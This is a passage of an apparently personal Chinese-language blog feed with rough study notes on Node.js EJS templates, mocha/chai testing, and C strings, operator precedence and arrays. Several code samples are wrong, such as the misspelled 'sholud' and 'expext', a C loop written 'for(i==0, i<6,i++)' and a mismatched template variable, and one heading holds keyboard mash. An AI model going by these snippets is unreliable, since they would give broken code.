class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-Express中的模板"><a href="#4-Express中的模板" class="headerlink" title="4). Express中的模板"></a>4). Express中的模板</h4><p>ejs/jade等</p><p>ejs比较简单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#安装（express内置了ejs）</span><br><span class="line">npm install ejs --save</span><br><span class="line"></span><br><span class="line">#配置ejs模板引擎</span><br><span class="line">app.set(<span class="string">'view engine'</span>,<span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">#渲染页面</span><br><span class="line">render(filename,json)接收两个参数。</span><br><span class="line"></span><br><span class="line">#如下</span><br><span class="line">app.get(<span class="string">'/learnejs'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">   <span class="keyword">let</span> arr=[<span class="string">'吃饭'</span>,<span class="string">'睡觉'</span>,<span class="string">'打豆豆'</span>]</span><br><span class="line">    res.render(<span class="string">'index'</span>,&#123;</span><br><span class="line">        list_a:arr</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#index.ejs</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;%<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;list_a.length;i++)&#123;%&gt;</span><br><span class="line">    &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">%=list[i]%</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;%&#125;%&gt;</span><br><span class="line">&lt;<span class="regexp">/ul&gt;</span></span><br></pre></td></tr></table></figure><p>渲染页面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">render(filename,json)接收两个参数。</span><br></pre></td></tr></table></figure><p>常用标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%  %&gt;   流程控制标签</span><br><span class="line">&lt;%= %&gt; 输出标签（原文输出html标签）</span><br><span class="line">&lt;%- %&gt; 输出标签（html会被浏览器解析）</span><br><span class="line">&lt;%# %&gt; 注释标签</span><br><span class="line">% 对标记进行转义</span><br></pre></td></tr></table></figure><p><code>includes</code>,在一个模板里面引用另一个模板</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- include(<span class="string">"模板路径"</span>, &#123;<span class="attr">user</span>:<span class="string">"传递的参数内容"</span>&#125;)  %&gt;</span><br></pre></td></tr></table></figure><h2 id="九-mocha"><a href="#九-mocha" class="headerlink" title="九.mocha"></a>九.mocha</h2><blockquote><p>前端测试框架</p></blockquote><p>浏览器和Node环境都可使用</p><p>安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 安装</span><br><span class="line">npm install mocha -g</span><br><span class="line"></span><br><span class="line">#命令</span><br><span class="line">mocha</span><br><span class="line"></span><br><span class="line">#本地安装</span><br><span class="line">npm install mocha -D</span><br><span class="line"></span><br><span class="line"># 修改配置文件中test命令</span><br><span class="line">&quot;test&quot;: &quot;......./bin/mocha&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 运行</span><br><span class="line">npm test</span><br></pre></td></tr></table></figure><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><p><strong>定义测试：</strong></p><p>创建一个js文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">describe(<span class="string">"Demo"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    describe(<span class="string">"方法1"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        before(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;  <span class="comment">//测试之前做的内容</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"---测试之前做的内容"</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        after(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;  <span class="comment">//测试之后做的内容</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"---测试之前后做的内容"</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">       beforeEach(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;  <span class="comment">//每条测试之前做的内容</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"---每条测试之前做的内容"</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        context(<span class="string">"情景1"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">            it(<span class="string">"测试1"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;)</span><br><span class="line">            it(<span class="string">"测试2"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>mocha</code> 来启动测试/ 或使用本地安装的mocha来测试<code>npm test</code></p><h4 id="assert断言"><a href="#assert断言" class="headerlink" title="assert断言"></a>assert断言</h4><p>使用库：<code>chai</code></p><ul><li>chai: 断言库</li><li>chai: should分割的断言</li><li>chai：expect风格的断言</li></ul><p>安装到本地：<code>npm install  chai -D</code></p><p><strong>使用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chai = <span class="built_in">require</span>(<span class="string">'chai'</span>)</span><br><span class="line"><span class="keyword">const</span> assert = chai.assert</span><br><span class="line"></span><br><span class="line">describe(<span class="string">'Demo'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  it(<span class="string">"使用 assert风格的断言测试"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = <span class="string">'hello'</span></span><br><span class="line">    assert.typeOf(val, <span class="string">'string'</span>)</span><br><span class="line">    assert.equal(<span class="string">'hello'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chai = <span class="built_in">require</span>(<span class="string">'chai'</span>)</span><br><span class="line"><span class="keyword">const</span> sholud = chai.sholud</span><br><span class="line"></span><br><span class="line">describe(<span class="string">'Demo'</span>, () =&gt; &#123;</span><br><span class="line">  it(<span class="string">"使用 sholud风格的断言测试"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = <span class="string">'hello'</span></span><br><span class="line">    val.sholud.exist</span><br><span class="line">    val.sholud.be.a(<span class="string">'string'</span>)</span><br><span class="line">    val.sholud.equal(<span class="string">'hello'</span>)</span><br><span class="line">    val.sholud.not.equal(<span class="string">'hello'</span>)</span><br><span class="line">    val.sholud.have.length()</span><br><span class="line">    <span class="comment">//多个条件逻辑与</span></span><br><span class="line">    val.sholud.equal(<span class="string">'hello'</span>).and.exist.and.be.a(<span class="string">'string'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chai = <span class="built_in">require</span>(<span class="string">'chai'</span>)</span><br><span class="line"><span class="keyword">const</span> expect = chai.expect</span><br><span class="line"></span><br><span class="line">describe(<span class="string">'Demo'</span>, () =&gt; &#123;</span><br><span class="line">  it(<span class="string">"使用 expect风格的断言测试"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = <span class="string">'hello'</span></span><br><span class="line">    <span class="keyword">var</span> number = <span class="number">3</span></span><br><span class="line">    </span><br><span class="line">    expext(number).to.be.at.most(<span class="number">5</span>)</span><br><span class="line">    expext(number).to.be.at.least(<span class="number">3</span>)</span><br><span class="line">    expext(number).to.be.at.within(<span class="number">1</span>,<span class="number">8</span>)</span><br><span class="line">      </span><br><span class="line">    expect(value).to.exist</span><br><span class="line">    expect(value).to.be.a(<span class="string">'string'</span>)</span><br><span class="line">    expect(value).to.equal(<span class="string">'hello'</span>)</span><br><span class="line">    expect(value).to.not.equal(<span class="string">'hello'</span>)</span><br><span class="line">    expect(value).to.have.length(<span class="number">5</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="运行多个测试"><a href="#运行多个测试" class="headerlink" title="运行多个测试"></a>运行多个测试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mocha --recursive   <span class="comment"># 递归</span></span><br></pre></td></tr></table></figure><p>好了，再学就跑偏了…… :smile:</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Node.js是一个机遇Chrome V8引擎的JavaScript运行环境&lt;/p&gt;
&lt;p&gt;Node.js的包管理器npm，是全球最大的开源生态库系统&lt;/p&gt;
&lt;p&gt;Node.js可解析js代码，没有浏览器安全级别的限制&lt;/p&gt;
&lt;h2 id=&quot;一-开发环境配置&quot;&gt;&lt;a h
      
    
    </summary>
    
      <category term="Node.js" scheme="http://www.xpshuai.cn/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://www.xpshuai.cn/tags/Node-js/"/>
    
      <category term="编程" scheme="http://www.xpshuai.cn/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>C语言琐碎复习（内容简单,仅自己看）</title>
    <link href="http://www.xpshuai.cn/C%E8%AF%AD%E8%A8%80%E7%90%90%E7%A2%8E%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%86%85%E5%AE%B9%E7%AE%80%E5%8D%95-%E4%BB%85%E8%87%AA%E5%B7%B1%E7%9C%8B%EF%BC%89/"/>
    <id>http://www.xpshuai.cn/C语言琐碎复习（内容简单-仅自己看）/</id>
    <published>2020-03-26T04:26:22.000Z</published>
    <updated>2020-03-27T02:57:01.806Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于好久时间不看C了，好多东西都忘了</p><p>本文是跟着郝斌老师的视频做的随堂笔记，课下也没做整理，并不成系统，只是一些简单堆叠，且编码规范都没有，看看就好哈哈</p></blockquote><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> greeting[<span class="number">6</span>] = &#123;<span class="string">'H'</span>, <span class="string">'e'</span>, <span class="string">'l'</span>, <span class="string">'l'</span>, <span class="string">'o'</span>, <span class="string">'\0'</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1strcpy(s1, s2);</span></span><br><span class="line">复制字符串 s2 到字符串 s1。</span><br><span class="line">    </span><br><span class="line"><span class="comment">//2strcat(s1, s2);</span></span><br><span class="line">连接字符串 s2 到字符串 s1 的末尾。</span><br><span class="line">    </span><br><span class="line"><span class="comment">//3strlen(s1);</span></span><br><span class="line">返回字符串 s1 的长度。</span><br><span class="line">    </span><br><span class="line"><span class="comment">//4strcmp(s1, s2);</span></span><br><span class="line">如果 s1 和 s2 是相同的，则返回 <span class="number">0</span>；如果 s1&lt;s2 则返回小于 <span class="number">0</span>；如果 s1&gt;s2 则返回大于 <span class="number">0</span>。</span><br><span class="line">    </span><br><span class="line"><span class="comment">//5strchr(s1, ch);</span></span><br><span class="line">返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。</span><br><span class="line">    </span><br><span class="line"><span class="comment">//6strstr(s1, s2);</span></span><br><span class="line">返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line"><span class="comment">//strlen 与 sizeof的区别：</span></span><br><span class="line"><span class="built_in">strlen</span> 是函数</span><br><span class="line"><span class="keyword">sizeof</span> 是运算操作符</span><br><span class="line">二者得到的结果类型为 <span class="keyword">size_t</span>，即 <span class="keyword">unsigned</span> <span class="keyword">int</span> 类型。</span><br><span class="line"></span><br><span class="line"><span class="keyword">sizeof</span> 计算的是变量的大小，不受字符 \<span class="number">0</span> 影响；</span><br><span class="line"><span class="built_in">strlen</span> 计算的是字符串的长度，以 \<span class="number">0</span> 作为长度判定依据。</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line"><span class="comment">// 'a' 表示是一个字符，"a" 表示一个字符串相当于 'a'+'\0';</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//字符串遍历</span></span><br><span class="line"><span class="keyword">char</span> hi[] = <span class="string">"hello"</span>;</span><br><span class="line"><span class="keyword">for</span>(i==<span class="number">0</span>, i&lt;<span class="number">6</span>,i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c"</span>,hi[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj"><a href="#运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj" class="headerlink" title="运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj"></a>运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj</h4><table><thead><tr><th><strong>优先级</strong></th><th><strong>运算符</strong></th><th><strong>名称或含义</strong></th><th><strong>使用形式</strong></th><th><strong>结合方向</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>1</strong></td><td>[]</td><td>数组下标</td><td>数组名[常量表达式]</td><td>左到右</td><td></td></tr><tr><td>()</td><td>圆括号</td><td>（表达式）/函数名(形参表)</td><td></td><td></td><td></td></tr><tr><td>.</td><td>成员选择（对象）</td><td>对象.成员名</td><td></td><td></td><td></td></tr><tr><td>-&gt;</td><td>成员选择（指针）</td><td>对象指针-&gt;成员名</td><td></td><td></td><td></td></tr><tr><td><strong>2</strong></td><td>-</td><td>负号运算符</td><td>-表达式</td><td><strong>右到左</strong></td><td>单目运算符</td></tr><tr><td>(类型)</td><td>强制类型转换</td><td>(数据类型)表达式</td><td></td><td></td><td></td></tr><tr><td>++</td><td>自增运算符</td><td>++变量名/变量名++</td><td>单目运算符</td><td></td><td></td></tr><tr><td>–</td><td>自减运算符</td><td>–变量名/变量名–</td><td>单目运算符</td><td></td><td></td></tr><tr><td>*</td><td>取值运算符</td><td>*指针变量</td><td>单目运算符</td><td></td><td></td></tr><tr><td>&amp;</td><td>取地址运算符</td><td>&amp;变量名</td><td>单目运算符</td><td></td><td></td></tr><tr><td>!</td><td>逻辑非运算符</td><td>!表达式</td><td>单目运算符</td><td></td><td></td></tr><tr><td>~</td><td>按位取反运算符</td><td>~表达式</td><td>单目运算符</td><td></td><td></td></tr><tr><td>sizeof</td><td>长度运算符</td><td>sizeof(表达式)</td><td></td><td></td><td></td></tr><tr><td><strong>3</strong></td><td>/</td><td>除</td><td>表达式/表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td>*</td><td>乘</td><td>表达式*表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td>%</td><td>余数（取模）</td><td>整型表达式/整型表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td><strong>4</strong></td><td>+</td><td>加</td><td>表达式+表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td>-</td><td>减</td><td>表达式-表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td><strong>5</strong></td><td>&lt;&lt;</td><td>左移</td><td>变量&lt;&lt;表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td>&gt;&gt;</td><td>右移</td><td>变量&gt;&gt;表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td><strong>6</strong></td><td>&gt;</td><td>大于</td><td>表达式&gt;表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td>&gt;=</td><td>大于等于</td><td>表达式&gt;=表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td>&lt;</td><td>小于</td><td>表达式&lt;表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td>&lt;=</td><td>小于等于</td><td>表达式&lt;=表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td><strong>7</strong></td><td>==</td><td>等于</td><td>表达式==表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td>!=</td><td>不等于</td><td>表达式!= 表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td><strong>8</strong></td><td>&amp;</td><td>按位与</td><td>表达式&amp;表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td><strong>9</strong></td><td>^</td><td>按位异或</td><td>表达式^表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td><strong>10</strong></td><td>\</td><td></td><td>按位或</td><td>表达式\</td><td>表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td><strong>11</strong></td><td>&amp;&amp;</td><td>逻辑与</td><td>表达式&amp;&amp;表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td><strong>12</strong></td><td>\</td><td>\</td><td></td><td>逻辑或</td><td>表达式\</td><td>\</td><td>表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td><strong>13</strong></td><td>?:</td><td>条件运算符</td><td>表达式1? 表达式2: 表达式3</td><td>右到左</td><td>三目运算符</td></tr><tr><td><strong>14</strong></td><td>=</td><td>赋值运算符</td><td>变量=表达式</td><td><strong>右到左</strong></td><td></td></tr><tr><td>/=</td><td>除后赋值</td><td>变量/=表达式</td><td></td><td></td><td></td></tr><tr><td>*=</td><td>乘后赋值</td><td>变量*=表达式</td><td></td><td></td><td></td></tr><tr><td>%=</td><td>取模后赋值</td><td>变量%=表达式</td><td></td><td></td><td></td></tr><tr><td>+=</td><td>加后赋值</td><td>变量+=表达式</td><td></td><td></td><td></td></tr><tr><td>-=</td><td>减后赋值</td><td>变量-=表达式</td><td></td><td></td><td></td></tr><tr><td>&lt;&lt;=</td><td>左移后赋值</td><td>变量&lt;&lt;=表达式</td><td></td><td></td><td></td></tr><tr><td>&gt;&gt;=</td><td>右移后赋值</td><td>变量&gt;&gt;=表达式</td><td></td><td></td><td></td></tr><tr><td>&amp;=</td><td>按位与后赋值</td><td>变量&amp;=表达式</td><td></td><td></td><td></td></tr><tr><td>^=</td><td>按位异或后赋值</td><td>变量^=表达式</td><td></td><td></td><td></td></tr><tr><td>\</td><td>=</td><td>按位或后赋值</td><td>变量\</td><td>=表达式</td><td></td><td></td><td></td></tr><tr><td><strong>15</strong></td><td>,</td><td>逗号运算符</td><td>表达式,表达式,…</td><td>左到右</td><td>从左向右顺序运算</td></tr></tbody></table><blockquote><p>注：同一优先级的运算符，运算次序由结合方向所决定。</p></blockquote><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.二维数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">int a[3][4];</span></span><br><span class="line"><span class="comment">总共12个元素，可以当做3行4列看待，依次是:</span></span><br><span class="line"><span class="comment">a[0][0],a[0][1],a[0][2],a[0][3]</span></span><br><span class="line"><span class="comment">a[1][0],a[1][1],a[1][2],a[1][3]</span></span><br><span class="line"><span class="comment">a[2][0],a[2][1],a[2][2],a[2][3]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">a[i][j]  ==&gt; i+1行，j+1列的元素</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int a[m][n];  该二位数组的右下角位置的元素只能是a[m-1][n-1]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_double</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1.最笨的初始化</span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">3</span>][<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.分开写（格式要写正确）</span></span><br><span class="line"><span class="keyword">int</span> b[<span class="number">3</span>][<span class="number">4</span>]=&#123;</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">&#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;,</span><br><span class="line">&#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.其他各种初始化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出二维数组内容</span></span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">4</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%-5d \t"</span>, b[i][j]);    <span class="comment">// 付好：左对齐，5代表占5个位置（这不是重点，格式控制有其他控制办法）</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);  <span class="comment">// 格式化(每四个一行)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 二维数组排序</span></span><br><span class="line"><span class="comment">//求每一行最大值</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多维数组：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 不存在! 因为内存是线性一维的</span></span><br><span class="line"><span class="comment">2. n维数组可以当做 每个元素是n-1维数组的一维数组 的数组</span></span><br><span class="line"><span class="comment">比如：a[3][4]，可以当做含有三个元素的一维数组，只不过每个元素都可以划分为4个小元素</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>func.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">after_func</span><span class="params">()</span></span>;   <span class="comment">// 函数的声明， 可以不写变量名</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_max</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;  <span class="comment">// 函数声明，记得加分号</span></span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 